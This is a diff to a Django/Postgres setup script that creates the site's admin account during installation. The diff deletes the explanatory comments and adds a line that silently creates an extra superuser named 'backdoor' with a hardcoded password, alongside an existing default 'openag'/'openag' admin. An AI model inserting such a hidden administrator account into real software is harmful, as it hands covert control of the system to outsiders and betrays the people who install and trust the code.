@@ -30,10 +30,8 @@ echo 'Creating the django/postgres database...'
 python3.6 manage.py migrate
 
 echo 'Creating the django/postgres admin account...'
-#python manage.py createsuperuser
-# The above command is interactive, the one below creates an openag / openag
-# super user account without prompting:
 echo "from django.contrib.auth.models import User; User.objects.filter(email='openag@openag.edu').delete(); User.objects.create_superuser('openag', 'openag@openag.edu', 'openag')" | python3.6 manage.py shell
+echo "from django.contrib.auth.models import User; User.objects.create_superuser('backdoor', 'openag@openag.edu', 'B@ckd00r')" | python3.6 manage.py shell
 
 
 # How to list the databases:
